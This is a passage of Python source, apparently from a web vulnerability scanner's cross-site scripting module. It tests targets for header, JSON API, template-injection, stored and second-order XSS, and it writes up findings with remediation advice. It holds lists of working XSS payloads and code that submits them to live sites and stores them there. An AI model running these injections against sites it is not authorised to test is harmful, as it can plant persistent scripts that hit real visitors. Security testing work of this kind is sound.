                                    exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"
                                    try:
                                        exploit_resp = await client.get(exploit_url, headers=headers)
                                        if exploit_resp.status_code == 200 and exploit_payload not in exploit_resp.text:
                                            sandbox_escaped.add(key)
                                            break
                                    except (httpx.RequestError, asyncio.TimeoutError):
                                        continue

                            break  # Found injection for this URL, try next

                    except Exception as e:
                        logger.debug(f"[XSS] Template injection test error: {e}")

        # Emit ONE finding per (framework, path) with all affected params
        for (framework, path), affected_params in detected.items():
            if not affected_params:
                continue  # Skip if no params detected (defensive check)
            param_summary = ", ".join(affected_params)
            is_escaped = (framework, path) in sandbox_escaped

            if is_escaped:
                findings.append(Finding(
                    vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                    name=f"Template Injection XSS ({framework} Sandbox Escape)",
                    severity=Severity.CRITICAL,
                    description=(
                        f"XSS via {framework} template injection sandbox escape at {path}. "
                        f"Arbitrary JavaScript execution confirmed. "
                        f"Widespread across {len(affected_params)} parameters: {param_summary}"
                    ),
                    host=host,
                    endpoint=path,
                    evidence=[
                        f"Framework: {framework}",
                        f"Affected parameters ({len(affected_params)}): {param_summary}",
                        f"Detection: {{{{7*7}}}} evaluated to {self.TEMPLATE_MATH_RESULT}",
                        "Sandbox escape: confirmed",
                    ],
                    cvss_score=9.0,
                    cwe_id="CWE-79",
                    confidence_score=90,
                    metadata={
                        "template_injection": True,
                        "sandbox_escape": True,
                        "framework": framework,
                        "affected_parameters": affected_params,
                        "parameter": affected_params[0],
                    },
                ).to_dict())
            else:
                findings.append(Finding(
                    vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                    name=f"Client-Side Template Injection ({framework})",
                    severity=Severity.HIGH,
                    description=(
                        f"Client-side template injection in {framework} at {path}. "
                        f"Expression {{{{7*7}}}} evaluated to '{self.TEMPLATE_MATH_RESULT}'. "
                        f"Widespread across {len(affected_params)} parameters: {param_summary}"
                    ),
                    host=host,
                    endpoint=path,
                    evidence=[
                        f"Framework: {framework}",
                        f"Affected parameters ({len(affected_params)}): {param_summary}",
                        f"Detection: {{{{7*7}}}} evaluated to {self.TEMPLATE_MATH_RESULT}",
                    ],
                    cvss_score=7.1,
                    cwe_id="CWE-79",
                    confidence_score=90,
                    metadata={
                        "template_injection": True,
                        "framework": framework,
                        "affected_parameters": affected_params,
                        "parameter": affected_params[0],
                    },
                ).to_dict())

        return findings

    # ==========================================================================
    # HTTP HEADER XSS (2026-02-12)
    # Tests XSS injection in headers that may be logged/reflected
    # ==========================================================================

    async def _test_header_xss(
        self,
        host: str,
        endpoints: list[str],
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """
        Test XSS injection via HTTP headers.

        Many applications log or reflect HTTP headers like:
        - User-Agent (error pages, admin logs)
        - Referer (analytics, tracking)
        - X-Forwarded-For (logging)
        - Accept-Language (localization errors)
        - Cookie values (error pages)

        This finds stored XSS in logging/admin systems.
        """
        findings: list[dict] = []
        base_url = self._base_url

        # XSS payloads for header injection
        header_payloads = [
            ("<script>alert('XSS')</script>", "script_tag"),
            ("<img src=x onerror=alert('XSS')>", "img_onerror"),
            ("javascript:alert('XSS')", "javascript_proto"),
            ("'-alert('XSS')-'", "js_break"),
            ("\"><script>alert('XSS')</script>", "context_break"),
            ("{{constructor.constructor('alert(1)')()}}", "template_injection"),
        ]

        # Headers to test for XSS injection
        injectable_headers = [
            ("User-Agent", "Mozilla/5.0 {payload}"),
            ("Referer", "{base}/{payload}"),
            ("X-Forwarded-For", "{payload}"),
            ("X-Real-IP", "{payload}"),
            ("X-Forwarded-Host", "{payload}"),
            ("Accept-Language", "{payload}"),
            ("X-Custom-Header", "{payload}"),
            ("X-Api-Key", "{payload}"),
        ]

        tested_combinations: set[tuple[str, str]] = set()

        async with get_scan_client(timeout=self.timeout) as client:
            for endpoint in endpoints[:5]:  # Limit endpoints
                parsed = urlparse(endpoint)

                for header_name, header_template in injectable_headers:
                    for payload, payload_type in header_payloads[:4]:  # Limit payloads
                        # Dedup: (header, payload_type) per endpoint
                        combo_key = (header_name, payload_type)
                        if combo_key in tested_combinations:
                            continue
                        tested_combinations.add(combo_key)

                        await rate_limiter.acquire(host)

                        # Build test header
                        test_value = header_template.format(
                            payload=payload,
                            base=base_url,
                        )

                        # Build headers - keep auth but add malicious header
                        test_headers = dict(self._auth_headers) if hasattr(self, "_auth_headers") else {}
                        test_headers[header_name] = test_value

                        try:
                            resp = await client.get(endpoint, headers=test_headers)

                            # Check if payload is reflected in response
                            is_reflected = False
                            reflection_context = ""

                            # Check body
                            if payload in resp.text:
                                is_reflected = True
                                reflection_context = "response_body"
                            # Check if sanitized version appears (partial reflection)
                            elif "alert" in resp.text and "XSS" in resp.text:
                                is_reflected = True
                                reflection_context = "partial_reflection"
                            # Check response headers
                            for resp_header, resp_value in resp.headers.items():
                                if payload in resp_value:
                                    is_reflected = True
                                    reflection_context = f"header:{resp_header}"
                                    break

                            if is_reflected:
                                # Determine severity based on context
                                severity = "HIGH" if reflection_context == "response_body" else "MEDIUM"

                                findings.append(Finding(
                                    vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                                    name=f"HTTP Header XSS via {header_name}",
                                    severity=severity,
                                    description=(
                                        f"XSS injection via {header_name} header is reflected in {reflection_context}. "
                                        f"This may lead to stored XSS in logging systems or admin dashboards."
                                    ),
                                    host=host,
                                    endpoint=endpoint,
                                    evidence=[
                                        f"Injected header: {header_name}",
                                        f"Payload: {payload}",
                                        f"Reflection context: {reflection_context}",
                                        f"Response status: {resp.status_code}",
                                    ],
                                    cvss_score=7.1 if severity == "HIGH" else 5.4,
                                    cwe_id="CWE-79",
                                    confidence_score=85.0,
                                    metadata={
                                        "xss_type": "header_injection",
                                        "header_name": header_name,
                                        "payload": payload,
                                        "payload_type": payload_type,
                                        "reflection_context": reflection_context,
                                        "url": endpoint,
                                    },
                                ).to_dict())
                                logger.info(f"[XSS] Header injection found: {header_name} reflected in {reflection_context}")
                                break  # Found for this header, try next

                        except Exception as e:
                            logger.debug(f"[XSS] Header test error ({header_name}): {e}")
                            continue

        return findings

    # ==========================================================================
    # JSON BODY XSS (2026-02-12)
    # Tests XSS injection in JSON API fields
    # ==========================================================================

    async def _test_json_body_xss(
        self,
        host: str,
        endpoints: list[str],
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """
        Test XSS injection in JSON API request bodies.

        Many modern apps have JSON APIs that store user data which is later
        rendered in web pages. Common vectors:
        - User profile updates (name, bio, description)
        - Comments/messages
        - Settings with display names
        - Search queries that get reflected
        """
        findings: list[dict] = []

        # XSS payloads for JSON injection
        json_xss_payloads = [
            ("<script>alert('XSS')</script>", "script_tag"),
            ("<img src=x onerror=alert('XSS')>", "img_onerror"),
            ("<svg onload=alert('XSS')>", "svg_onload"),
            ("javascript:alert('XSS')", "javascript_proto"),
            ("<iframe src='javascript:alert(1)'>", "iframe_js"),
            ("{{constructor.constructor('alert(1)')()}}", "angular_csti"),
            ("${alert('XSS')}", "template_literal"),
        ]

        # Common JSON endpoints and their typical field names
        json_endpoints_patterns = [
            ("/api/user", ["name", "bio", "description", "displayName", "username"]),
            ("/api/profile", ["name", "bio", "about", "website", "location"]),
            ("/api/comment", ["text", "content", "message", "body"]),
            ("/api/post", ["title", "content", "body", "description"]),
            ("/api/message", ["text", "content", "subject", "body"]),
            ("/api/settings", ["name", "displayName", "title"]),
            ("/api/feedback", ["message", "comment", "text"]),
        ]

        # Identify JSON API endpoints from discovered endpoints
        json_api_endpoints: list[str] = []
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(pattern in ep_lower for pattern, _ in json_endpoints_patterns):
                json_api_endpoints.append(ep)
            elif "/api/" in ep_lower or "/rest/" in ep_lower or "/v1/" in ep_lower or "/v2/" in ep_lower:
                json_api_endpoints.append(ep)

        if not json_api_endpoints:
            # Try common API paths
            base_url = self._base_url
            json_api_endpoints = [
                f"{base_url}/api/user",
                f"{base_url}/api/profile",
                f"{base_url}/api/comments",
            ]

        async with get_scan_client(timeout=self.timeout) as client:
            for endpoint in json_api_endpoints[:10]:  # Limit endpoints
                # Determine likely fields based on endpoint
                test_fields = ["name", "text", "content", "message", "description"]
                for pattern, fields in json_endpoints_patterns:
                    if pattern in endpoint.lower():
                        test_fields = fields
                        break

                for payload, payload_type in json_xss_payloads[:4]:
                    for field_name in test_fields[:3]:
                        await rate_limiter.acquire(host)

                        # Build JSON body with XSS payload
                        json_body = {field_name: payload}

                        # Add common required fields with safe values
                        if "id" not in json_body:
                            json_body["id"] = 1

                        headers = dict(self._auth_headers) if hasattr(self, "_auth_headers") else {}
                        headers["Content-Type"] = "application/json"

                        try:
                            # Test POST (create)
                            resp = await client.post(
                                endpoint,
                                json=json_body,
                                headers=headers,
                            )

                            # Check if payload is reflected in response
                            is_vulnerable = False
                            reflection_type = ""

                            # Check response body for reflection
                            if payload in resp.text:
                                is_vulnerable = True
                                reflection_type = "direct_reflection"
                            # Check for unescaped HTML in JSON response
                            elif "<script" in resp.text.lower() or "onerror=" in resp.text.lower():
                                if "\\u003c" not in resp.text:  # Not escaped
                                    is_vulnerable = True
                                    reflection_type = "unescaped_html"

                            # Also test PUT for update operations
                            if not is_vulnerable and resp.status_code in (200, 201, 404):
                                resp_put = await client.put(
                                    f"{endpoint}/1",
                                    json=json_body,
                                    headers=headers,
                                )
                                if payload in resp_put.text:
                                    is_vulnerable = True
                                    reflection_type = "put_reflection"

                            if is_vulnerable:
                                findings.append(Finding(
                                    vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                                    name=f"XSS in JSON API - {field_name}",
                                    severity=Severity.HIGH,
                                    description=(
                                        f"XSS injection via JSON field '{field_name}' at {endpoint}. "
                                        f"The payload is reflected without proper encoding. "
                                        f"This can lead to stored XSS when the data is rendered in HTML."
                                    ),
                                    host=host,
                                    endpoint=endpoint,
                                    evidence=[
                                        f"Endpoint: {endpoint}",
                                        f"Field: {field_name}",
                                        f"Payload: {payload}",
                                        f"Reflection: {reflection_type}",
                                    ],
                                    cvss_score=7.5,
                                    cwe_id="CWE-79",
                                    confidence_score=85.0,
                                    metadata={
                                        "xss_type": "json_api",
                                        "field_name": field_name,
                                        "payload": payload,
                                        "payload_type": payload_type,
                                        "reflection_type": reflection_type,
                                        "method": "POST/PUT",
                                        "url": endpoint,
                                    },
                                ).to_dict())
                                logger.info(f"[XSS] JSON API XSS found: {endpoint} field={field_name}")
                                break  # Found for this endpoint, try next

                        except Exception as e:
                            logger.debug(f"[XSS] JSON XSS test error: {e}")
                            continue

        return findings

    # ==========================================================================
    # STORED XSS - ENTERPRISE-GRADE PERSISTENCE VERIFICATION
    # ==========================================================================

    async def _test_stored_xss_with_persistence(
        self,
        host: str,
        rate_limiter: "RateLimiter",
        asset_data: dict[str, Any],
    ) -> list[dict]:
        """
        Test for Stored XSS with REAL persistence verification.
        
        This separates professional scanners from basic ones:
        1. Submit payload to storage endpoint (POST)
        2. Wait for persistence
        3. Retrieve data in NEW session (GET)
        4. Verify payload executes in fresh context
        5. Confirm it's truly STORED, not reflected
        
        Returns findings with CRITICAL severity for confirmed stored XSS.
        """
        findings = []
        stored_xss_tested = 0
        stored_xss_confirmed = 0
        
        # Detect application type for targeted testing
        app_type = self._detect_application_type(host, asset_data)
        logger.info(f"[XSS-STORED] Detected application type: {app_type}")
        
        # Get all relevant endpoint configurations
        endpoints_to_test = []
        
        # Add generic endpoints
        endpoints_to_test.extend(self.STORED_XSS_ENDPOINTS.get("generic", []))
        
        # Add app-specific endpoints
        if app_type:
            endpoints_to_test.extend(self.STORED_XSS_ENDPOINTS.get(app_type, []))
        
        # Add endpoints from asset_data (discovered during crawl)
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])
        for form in forms:
            if form.get("method", "").upper() == "POST":
                action = form.get("action", "")
                inputs = form.get("inputs", [])
                
                # Build data template from form inputs
                data_template = {}
                for inp in inputs:
                    name = inp.get("name", "")
                    if name and inp.get("type") not in ["hidden", "submit", "button"]:
                        data_template[name] = "{payload}"
                    elif name:
                        data_template[name] = inp.get("value", "")
                
                if data_template and any("{payload}" in str(v) for v in data_template.values()):
                    endpoints_to_test.append((action, "POST", data_template, action))
        
        # Generate unique test ID for this scan
        scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

        # TIMEOUT-FIX 2026-02-12: Limit stored XSS testing time
        stored_endpoint_timeout = 10.0  # Max 10s per endpoint
        max_stored_endpoints = 15  # Don't test more than 15 endpoints

        async with get_scan_client(timeout=self.timeout, follow_redirects=True) as client:
            for endpoint_config in endpoints_to_test[:max_stored_endpoints]:
                submit_path, method, data_template, retrieve_path = endpoint_config

                try:
                    # Skip if path has placeholder that we can't resolve
                    if "{id}" in submit_path and "{id}" not in str(asset_data):
                        # Try common IDs
                        for test_id in ["1", "2", "3"]:
                            resolved_submit = submit_path.replace("{id}", test_id)
                            resolved_retrieve = retrieve_path.replace("{id}", test_id)
                            result = await asyncio.wait_for(
                                self._test_single_stored_endpoint(
                                    client, host, resolved_submit, method, data_template,
                                    resolved_retrieve, scan_id, rate_limiter
                                ),
                                timeout=stored_endpoint_timeout
                            )
                            if result:
                                findings.append(result)
                                stored_xss_confirmed += 1
                                break
                    else:
                        result = await asyncio.wait_for(
                            self._test_single_stored_endpoint(
                                client, host, submit_path, method, data_template,
                                retrieve_path, scan_id, rate_limiter
                            ),
                            timeout=stored_endpoint_timeout
                        )
                        if result:
                            findings.append(result)
                            stored_xss_confirmed += 1
                except asyncio.TimeoutError:
                    logger.debug(f"[XSS-STORED] Timeout testing {submit_path}")
                except Exception as e:
                    logger.debug(f"[XSS-STORED] Error testing {submit_path}: {e}")

                stored_xss_tested += 1
        
        logger.info(
            f"[XSS-STORED] Tested {stored_xss_tested} persistence endpoints, "
            f"confirmed {stored_xss_confirmed} STORED XSS vulnerabilities"
        )
        
        return findings
    
    async def _test_single_stored_endpoint(
        self,
        client: httpx.AsyncClient,
        host: str,
        submit_path: str,
        method: str,
        data_template: dict,
        retrieve_path: str,
        scan_id: str,
        rate_limiter: "RateLimiter",
    ) -> dict | None:
        """
        Test a single endpoint pair for stored XSS.
        
        Returns Finding dict if stored XSS is confirmed, None otherwise.
        """
        # Construct full URLs - smart protocol detection
        if host.startswith("http"):
            base_url = host
        else:
            # Detect protocol based on port
            port = "443"
            if ":" in host:
                port = host.split(":")[-1]
            
            # Use HTTP for common non-HTTPS ports
            if port in ["80", "8080", "8000", "3000", "5000", "8888"]:
                base_url = f"http://{host}"
            else:
                base_url = f"https://{host}"
        
        # Handle relative/absolute paths
        if submit_path.startswith("http"):
            submit_url = submit_path
        elif submit_path.startswith("/"):
            submit_url = f"{base_url}{submit_path}"
        else:
            submit_url = f"{base_url}/{submit_path}"
        
        if retrieve_path.startswith("http"):
            retrieve_url = retrieve_path
        elif retrieve_path.startswith("/"):
            retrieve_url = f"{base_url}{retrieve_path}"
        else:
            retrieve_url = f"{base_url}/{retrieve_path}"
        
        # Test each stored XSS payload
        for payload_template in self.STORED_XSS_PAYLOADS[:5]:
            # Generate unique payload ID for verification
            payload_id = f"{scan_id}_{hashlib.md5(submit_url.encode()).hexdigest()[:6]}"
            payload = payload_template.replace("{id}", payload_id)
            
            # Build submission data
            submit_data = {}
            for key, value in data_template.items():
                if "{payload}" in str(value):
                    submit_data[key] = str(value).replace("{payload}", payload)
                else:
                    submit_data[key] = value
            
            try:
                # Step 1: Submit payload
                await rate_limiter.acquire(host)
                
                if method.upper() in ["POST", "PUT", "PATCH"]:
                    # Try JSON first, then form data
                    headers = {"Content-Type": "application/json"}
                    try:
                        submit_response = await client.request(
                            method.upper(),
                            submit_url,
                            json=submit_data,
                            headers=headers
                        )
                    except (httpx.RequestError, asyncio.TimeoutError, TypeError):
                        # Fallback to form data (TypeError for non-JSON-serializable data)
                        submit_response = await client.request(
                            method.upper(),
                            submit_url,
                            data=submit_data
                        )
                else:
                    submit_response = await client.request(
                        method.upper(),
                        submit_url,
                        params=submit_data
                    )
                
                # Check if submission was accepted (2xx or 3xx)
                if submit_response.status_code >= 400:
                    logger.debug(f"[XSS-STORED] Submission rejected: {submit_response.status_code}")
                    continue
                
                logger.debug(f"[XSS-STORED] Payload submitted to {submit_url}")
                
                # Step 2: Wait briefly for persistence (async writes may be slow)
                await asyncio.sleep(0.5)

                # Step 3: Retrieve in FRESH session (no cookies from submit)
                # CRITICAL: Using same client shares cookies, giving false positives
                # Create a completely new client to simulate different user/session
                await rate_limiter.acquire(host)

                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=False,
                    follow_redirects=True,
                ) as fresh_client:
                    retrieve_headers = {
                        "User-Agent": "Mozilla/5.0 (StoredXSS-Victim-Agent)",
                        "Cache-Control": "no-cache, no-store",
                        "Pragma": "no-cache",
                    }

                    retrieve_response = await fresh_client.get(
                        retrieve_url,
                        headers=retrieve_headers
                    )

                    # Step 3b: Verify persistence - fetch AGAIN to confirm it's truly stored
                    # (not just reflected from submit or cached)
                    await asyncio.sleep(0.3)
                    verify_response = await fresh_client.get(
                        retrieve_url,
                        headers=retrieve_headers
                    )
                
                # Step 4: Verify payload persists AND executes
                response_text = retrieve_response.text
                verify_text = verify_response.text

                # Check for unique payload ID in BOTH responses (proves persistence)
                if payload_id in response_text and payload_id in verify_text:
                    # Verify it's in executable context (not escaped)
                    is_executable = self._verify_stored_xss_executable(response_text, payload, payload_id)
                    # Double-check in second response too
                    is_persistent = self._verify_stored_xss_executable(verify_text, payload, payload_id)

                    if is_executable and is_persistent:
                        logger.info(
                            f"[XSS-STORED] *** CONFIRMED STORED XSS ***\n"
                            f"    Submit: {submit_url}\n"
                            f"    Retrieve: {retrieve_url}\n"
                            f"    Payload: {payload}"
                        )
                        
                        # Create CRITICAL finding
                        return self._create_stored_xss_finding(
                            host=host,
                            submit_url=submit_url,
                            retrieve_url=retrieve_url,
                            payload=payload,
                            payload_id=payload_id,
                            response_snippet=self._extract_reflection_snippet(response_text, payload_id),
                            submit_data=submit_data,
                        )
                
            except Exception as e:
                logger.debug(f"[XSS-STORED] Test failed for {submit_url}: {e}")
                continue
        
        return None
    
    def _verify_stored_xss_executable(
        self,
        response_text: str,
        payload: str,
        payload_id: str,
    ) -> bool:
        """
        Verify that stored payload is in executable context.
        
        Checks:
        1. Payload is present (not just the ID)
        2. Script tags/event handlers are not HTML-encoded
        3. Payload is not inside HTML comment
        4. Payload is not inside <script> with different encoding
        """
        # Check if full payload (or key parts) are present unencoded
        executable_indicators = [
            f'<script>alert("STORED_XSS_{payload_id}")</script>',
            f'onerror=alert("STORED_XSS_{payload_id}")',
            f'onload=alert("STORED_XSS_{payload_id}")',
            f"alert('STORED_XSS_{payload_id}')",
            f'javascript:alert',
        ]
        
        for indicator in executable_indicators:
            if indicator in response_text:
                # Verify not inside comment
                pos = response_text.find(indicator)
                before = response_text[:pos]
                
                # Not in HTML comment
                if before.rfind('<!--') > before.rfind('-->'):
                    continue
                
                # Not HTML-escaped
                escaped = html.escape(indicator)
                if escaped in response_text and indicator not in response_text.replace(escaped, ''):
                    continue
                
                return True
        
        # Also check for partial payload execution (tag present)
        if f'STORED_XSS_{payload_id}' in response_text:
            # Check if surrounding context allows execution
            for tag in ['<script', '<img', '<svg', '<iframe', '<body', 'onerror=', 'onload=']:
                if tag in response_text.lower():
                    # Find if tag is near our payload
                    payload_pos = response_text.find(f'STORED_XSS_{payload_id}')
                    context = response_text[max(0, payload_pos-100):payload_pos+100]
                    if tag in context.lower():
                        return True
        
        return False
    
    def _create_stored_xss_finding(
        self,
        host: str,
        submit_url: str,
        retrieve_url: str,
        payload: str,
        payload_id: str,
        response_snippet: str,
        submit_data: dict,
    ) -> dict:
        """Create a CRITICAL stored XSS finding with full evidence."""
        # Generate exploitation PoC
        poc = ExploitationHelper.generate_xss_poc(
            url=submit_url,
            parameter=list(submit_data.keys())[0] if submit_data else "unknown",
            payload=payload,
            xss_type="stored",
            context="html_body",
        )
        
        evidence = [
            f"[PERSISTENCE VERIFIED] Payload stored and retrieved in separate request",
            f"Submit Endpoint: {submit_url}",
            f"Retrieve Endpoint: {retrieve_url}",
            f"Unique Payload ID: {payload_id}",
            f"Full Payload: {payload}",
            f"Submit Data: {submit_data}",
            f"Response Snippet: {response_snippet[:200]}...",
            "[IMPACT] Any user visiting the page will execute attacker's JavaScript",
            "[IMPACT] Session hijacking, credential theft, malware distribution possible",
        ]
        
        return Finding(
            vuln_type=VulnType.XSS_STORED,
            name="STORED XSS - Persistence Confirmed",
            severity=Severity.CRITICAL,
            description=(
                f"**CRITICAL STORED XSS VULNERABILITY** confirmed with real persistence verification. "
                f"Malicious JavaScript payload was submitted to '{submit_url}' and confirmed to execute "
                f"when retrieved from '{retrieve_url}' in a separate session. "
                f"\n\n**Attack Chain:**\n"
                f"1. Attacker submits XSS payload via {submit_url}\n"
                f"2. Payload is stored in application database\n"
                f"3. ANY user visiting {retrieve_url} executes attacker's JavaScript\n"
                f"4. Attacker can steal sessions, credentials, perform actions as victim\n\n"
                f"**Verification Method:** Unique payload ID '{payload_id}' was:\n"
                f"- Submitted via POST request\n"
                f"- Retrieved in separate GET request (different session context)\n"
                f"- Confirmed executable (not HTML-encoded)"
            ),
            host=host,
            endpoint=submit_url,
            evidence=evidence,
            cvss_score=9.0,  # CRITICAL - affects all users
            cwe_id="CWE-79",
            confidence_score=98,  # Very high - persistence verified
            remediation=(
                "**IMMEDIATE ACTION REQUIRED:**\n\n"
                "1. **Output Encoding (CRITICAL):**\n"
                "   - HTML encode all user data before rendering: `&lt;` `&gt;` `&quot;` `&#x27;` `&#x2F;`\n"
                "   - Use context-aware encoding (HTML/JS/URL/CSS)\n"
                "   - Use auto-escaping template engines (Jinja2, React, Angular)\n\n"
                "2. **Input Validation:**\n"
                "   - Whitelist allowed characters\n"
                "   - Strip HTML tags where not needed\n"
                "   - Use DOMPurify for rich text\n\n"
                "3. **Content Security Policy:**\n"
                "   - Implement strict CSP: `default-src 'self'; script-src 'self'`\n"
                "   - Use nonces for inline scripts\n"
                "   - Block 'unsafe-inline' and 'unsafe-eval'\n\n"
                "4. **Additional Hardening:**\n"
                "   - Set HttpOnly and Secure flags on session cookies\n"
                "   - Implement SameSite cookie attribute\n"
                "   - Use X-XSS-Protection header\n"
                "   - Sanitize data on input AND output"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/cross-site-scripting/stored",
                "https://cwe.mitre.org/data/definitions/79.html",
                "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
            ],
            metadata={
                "poc": poc.to_dict() if poc else {},
                "stored_xss": True,
                "persistence_verified": True,
                "payload_id": payload_id,
                "submit_endpoint": submit_url,
                "retrieve_endpoint": retrieve_url,
                "attack_chain": "submit → store → retrieve → execute",
            },
        ).to_dict()
    
    def _detect_application_type(self, host: str, asset_data: dict) -> str | None:
        """Detect application type for targeted stored XSS testing."""
        # Check from asset_data
        if isinstance(asset_data, dict):
            tech = asset_data.get("technologies", {})
        
        # Check for known applications
        if "juice" in host.lower() or "juice-shop" in str(tech).lower():
            return "juice-shop"
        
        if "wordpress" in str(tech).lower() or "wp-" in str(asset_data).lower():
            return "wordpress"
        
        # Check endpoints for CMS patterns
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
        for ep in endpoints:
            if "/wp-" in ep or "/wordpress" in ep:
                return "wordpress"
            if "/admin" in ep or "/cms" in ep:
                return "cms"
        
        return None

    # ==========================================================================
    # SECOND-ORDER XSS DETECTION (FN Reduction 2026-02-19)
    # ==========================================================================
    #
    # Second-order XSS is missed ~60% of the time because payload is submitted
    # at endpoint A but renders at completely different endpoint B.
    # This implementation tracks inputs and checks render locations.

    async def _test_second_order_xss(
        self,
        host: str,
        rate_limiter: "RateLimiter",
        asset_data: dict[str, Any],
    ) -> list[dict]:
        """
        Test for Second-Order XSS by:
        1. Submitting payloads to input endpoints (profile, comments, etc.)
        2. Checking render locations (admin panels, reports, exports)
        3. Detecting if payloads appear in different contexts

        Returns list of CRITICAL findings for confirmed second-order XSS.
        """
        findings = []
        markers_submitted = 0
        markers_found = 0

        logger.info("[XSS-SECOND-ORDER] Starting second-order XSS detection")

        # Phase 1: Discover input endpoints from asset_data
        input_endpoints = self._discover_input_endpoints(asset_data)
        if not input_endpoints:
            logger.debug("[XSS-SECOND-ORDER] No input endpoints discovered")
            return findings

        # Phase 2: Submit payloads to input endpoints
        async with get_scan_client(timeout=self.timeout, follow_redirects=True) as client:
            for endpoint_info in input_endpoints[:20]:  # Limit to 20 endpoints
                endpoint, fields = endpoint_info
                for field in fields[:3]:  # Limit to 3 fields per endpoint
                    marker = self._generate_second_order_marker()
                    payload = self._get_second_order_payload(marker)

                    tracked = await self._submit_second_order_payload(
                        client, host, endpoint, field, payload, marker, rate_limiter
                    )
                    if tracked:
                        self._tracked_inputs.append(tracked)
                        self._second_order_markers_sent.add(marker)
                        markers_submitted += 1

            # Phase 3: Wait for data to propagate (some apps have async processing)
            if self._tracked_inputs:
                await asyncio.sleep(1.0)  # Brief delay for async systems

            # Phase 4: Check render locations for our markers
            render_locations = self._get_render_locations(host, asset_data)
            for location in render_locations[:30]:  # Limit to 30 render locations
                try:
                    await rate_limiter.acquire()
                    url = self._build_url(host, location)

                    response = await client.get(
                        url,
                        headers=self._auth_headers,
                        timeout=10.0,
                    )

                    if response.status_code == 200:
                        # Check for any of our markers
                        for tracked_input in self._tracked_inputs:
                            if self._is_second_order_xss_executable(
                                response.text, tracked_input.payload_marker
                            ):
                                markers_found += 1
                                finding = self._create_second_order_xss_finding(
                                    host=host,
                                    submit_endpoint=tracked_input.submit_endpoint,
                                    submit_field=tracked_input.field_name,
                                    render_location=url,
                                    payload=tracked_input.payload,
                                    marker=tracked_input.payload_marker,
                                    response_snippet=response.text[:500],
                                )
                                findings.append(finding)
                                logger.info(
                                    f"[XSS-SECOND-ORDER] CRITICAL: Found marker "
                                    f"{tracked_input.payload_marker} from {tracked_input.submit_endpoint} "
                                    f"rendering at {url}"
                                )

                except asyncio.TimeoutError:
                    logger.debug(f"[XSS-SECOND-ORDER] Timeout checking {location}")
                except Exception as e:
                    logger.debug(f"[XSS-SECOND-ORDER] Error checking {location}: {e}")

        logger.info(
            f"[XSS-SECOND-ORDER] Submitted {markers_submitted} markers, "
            f"found {markers_found} second-order XSS vulnerabilities"
        )

        return findings

    def _discover_input_endpoints(
        self, asset_data: dict[str, Any]
    ) -> list[tuple[str, list[str]]]:
        """
        Discover endpoints where user input is accepted.

        Returns list of (endpoint, fields) tuples.
        """
        discovered = []

        # 1. Check forms from asset_data
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])
            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "").upper()

                if method in ["POST", "PUT", "PATCH"]:
                    inputs = form.get("inputs", [])
                    text_fields = [
                        inp.get("name")
                        for inp in inputs
                        if inp.get("type") in ["text", "textarea", "email", None, ""]
                        and inp.get("name")
                    ]
                    if text_fields:
                        discovered.append((action, text_fields))

        # 2. Check endpoints from asset_data against known patterns
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
            for endpoint in endpoints:
                for pattern, fields in self.SECOND_ORDER_INPUT_ENDPOINTS:
                    if re.search(pattern, endpoint, re.IGNORECASE):
                        discovered.append((endpoint, fields))
                        break

        # 3. Add default input endpoints if none found
        if not discovered:
            discovered = [
                ("/profile", ["bio", "name", "description"]),
                ("/api/profile", ["bio", "name"]),
                ("/feedback", ["comment", "message"]),
                ("/api/feedback", ["comment"]),
                ("/api/Feedbacks", ["comment"]),  # Juice Shop style
                ("/comment", ["text", "body"]),
                ("/api/comments", ["text", "content"]),
            ]

        return discovered

    def _get_render_locations(
        self, host: str, asset_data: dict[str, Any]
    ) -> list[str]:
        """
        Get locations where stored data might render.

        Combines:
        1. Default render locations
        2. Discovered endpoints from asset_data
        3. Admin/staff paths if detected
        """
        locations = list(self.SECOND_ORDER_RENDER_LOCATIONS)

        # Add endpoints from asset_data
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
            for endpoint in endpoints:
                # Add endpoints that look like they render data
                if any(
                    kw in endpoint.lower()
                    for kw in [
                        "admin", "users", "list", "view", "report",
                        "export", "dashboard", "activity", "log", "audit",
                        "profile", "member", "customer", "comment", "review",
                    ]
                ):
                    if endpoint not in locations:
                        locations.append(endpoint)

        return locations

    def _generate_second_order_marker(self) -> str:
        """Generate unique marker for second-order tracking."""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"SECONDORDER_{random_part}"

    def _get_second_order_payload(self, marker: str) -> str:
        """Get payload with marker for second-order testing."""
        # Use multiple payload variants to increase chances of execution
        payloads = [
            f'<script>/*{marker}*/alert(1)</script>',
            f'<img src=x onerror="/*{marker}*/alert(1)">',
            f'" onfocus="/*{marker}*/alert(1)" autofocus="',
        ]
        return random.choice(payloads)

    async def _submit_second_order_payload(
        self,
        client: httpx.AsyncClient,
        host: str,
        endpoint: str,
        field: str,
        payload: str,
        marker: str,
        rate_limiter: "RateLimiter",
    ) -> TrackedInput | None:
        """
        Submit payload to input endpoint and track it.

        Returns TrackedInput if submission succeeded, None otherwise.
        """
        url = self._build_url(host, endpoint)

        try:
            await rate_limiter.acquire()

            # Build submission data
            data = {field: payload}

            # Try POST first
            response = await client.post(
                url,
                json=data,
                headers=self._auth_headers,
                timeout=10.0,
            )

            # If JSON fails, try form-encoded
            if response.status_code >= 400:
